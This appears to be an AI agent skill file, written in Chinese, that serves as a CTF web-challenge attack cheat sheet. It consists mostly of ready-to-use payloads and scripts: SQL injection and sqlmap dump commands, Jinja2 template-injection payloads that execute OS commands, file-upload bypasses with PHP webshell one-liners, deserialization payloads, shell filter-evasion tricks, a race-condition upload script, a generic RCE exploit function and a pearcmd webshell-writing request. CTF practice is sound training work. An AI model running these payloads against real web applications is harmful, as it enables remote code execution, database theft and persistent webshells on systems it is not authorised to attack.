---
name: ctf-web专项攻击
description: Use when encountering ctf web题型专项突破 - 快速识别题型、常见技巧、自动化攻击脚本
---

# CTF Web专项攻击

## Info

- **Domain**: ctf
- **Tags**: ctf, web, challenges, tricks

## 快速识别题型

### 1. 源码泄露
```bash
# 常见泄露文件
.git/ .svn/ .DS_Store
.env .config.php.bak
www.zip web.zip backup.zip
.swp .swo (vim临时文件)
robots.txt sitemap.xml

# Git泄露利用
githacker --url http://target/.git/ --output git_src

# SVN泄露
svn checkout http://target/.svn/

# vim恢复
vim -r file.swp
```

### 2. SQL注入
```bash
# 快速判断
' " ) ')) '))-- -
1 and 1=1 / 1 and 1=2
-1 union select 1,2,3

# sqlmap自动化
sqlmap -u "url" --dbs --batch
sqlmap -u "url" -D db -T flag --dump

# 手工注入技巧
- 联合注入: UNION SELECT
- 报错注入: updatexml, extractvalue, floor
- 盲注: substr, ascii, length
- 时间盲注: sleep, benchmark
- 堆叠注入: ;执行多语句
```

### 3. SSTI模板注入
```python
# 探测
{{7*7}}  # 返回49则存在
${7*7}
<%= 7*7 %>

# Jinja2 RCE
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# 绕过技巧
- 无数字: lipsum|length 获取数字
- 无引号: request.args.xxx 通过参数传入
- 无下划线: |attr('\x5f\x5fclass\x5f\x5f')
- 无括号: {% if ... %}{% endif %}
```

### 4. 文件上传
```bash
# 绕过方式
1. 修改Content-Type: image/jpeg
2. 文件头伪造: GIF89a
3. 双写后缀: shell.php.jpg
4. 空格绕过: shell.php
5. 特殊后缀: php, phtml, php3, php5, pht
6. .htaccess覆盖: AddType application/x-httpd-php .jpg

# 图片马
copy image.jpg/b + shell.php/a shell.jpg
exiftool -Comment="<?php system($_GET['c']);?>" image.jpg
```

### 5. 反序列化
```php
// PHP反序列化
O:4:"Test":1:{s:3:"cmd";s:2:"id";}

// __wakeup绕过 (PHP < 7.0.10)
O:4:"Test":2:{s:3:"cmd";s:2:"id";}

// Phar反序列化
phar://shell.phar/test.txt
```

## 常见技巧

### 编码绕过
```bash
# URL编码
%27 = '
%22 = "
%00 = \x00 (空字节)

# 双重URL编码
%2527 = %27 = '

# Base64
echo -n "cat /flag" | base64
Y2F0IC9mbGFn

# Hex
cat /flag -> 0x636174202f666c6167

# Unicode
' -> \u0027
```

### 过滤绕过
```bash
# 空格绕过
cat</flag
cat${IFS}/flag
cat$IFS/flag
{cat,/flag}
cat%09/flag  # tab

# 命令执行绕过
whoami -> w\ho\am\i
whoami -> wh$()oami
whoami -> who`echo a`mi
whoami -> whoa''mi

# 关键字绕过
flag -> fl\ag
flag -> f.l.a.g
flag -> fl''ag
cat /flag -> ca\t /fl\ag

# 通配符
cat /f??g
cat /f*
/bin/c?t /flag
```

### 竞争条件
```bash
# 文件上传竞争
# 1. 上传shell.php
# 2. 删除前访问执行
# 3. 多线程并发

# 条件竞争脚本
import threading
import requests

def upload():
    while True:
        requests.post(url, files=file)

def access():
    while True:
        r = requests.get(shell_url)
        if 'flag' in r.text:
            print(r.text)
            exit()

for i in range(10):
    threading.Thread(target=upload).start()
    threading.Thread(target=access).start()
```

### 条件判断
```python
# Python条件表达式
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/flag').read() if '' else '' }}

# 短路求值
{{ None or ''.__class__.__mro__[2].__subclasses__()[40]('/flag').read() }}
```

## 快速攻击脚本

### 自动化探测
```bash
# 目录扫描
dirsearch -u http://target -e php,txt,zip

# 漏洞扫描
nuclei -u http://target -t cves/

# 子域名
subfinder -d target.com
```

### 通用RCE脚本
```python
import requests

def exploit(url, cmd):
    payloads = [
        f"{{{{ lipsum.__globals__['os'].popen('{cmd}').read() }}}}",
        f"{{{{ config.__class__.__init__.__globals__['os'].popen('{cmd}').read() }}}}",
        f"{{{{ cycler.__init__.__globals__.os.popen('{cmd}').read() }}}}",
    ]
    for payload in payloads:
        r = requests.get(url, params={'input': payload})
        if 'flag' in r.text.lower():
            print(f"[+] Found: {r.text}")
            return
```

## 常见Flag位置
```
/flag
/flag.txt
/home/flag
/var/www/html/flag.php
/var/www/html/flag.txt
环境变量: $FLAG, $_ENV['FLAG']
数据库: SELECT * FROM flag
```

## 骚操作

### 无字母数字RCE
```php
// PHP自增
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$_++;$_++;$_++;$_++;$____=$_;$_++;$_++;

// 异或
${'_GET'}[_](${ '_GET'}[__]); // ?_=system&__=id

// 取反
${~"\xa0\xb8\xba\xab"} // $_GET
```

### Pearcmd利用
```bash
# /index.php?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=system($_GET['c']);?>+/var/www/html/shell.php
```

### SplFileObject
```php
// 读取文件
new SplFileObject('/flag');

// 列目录
new GlobIterator('/var/www/html/*');
```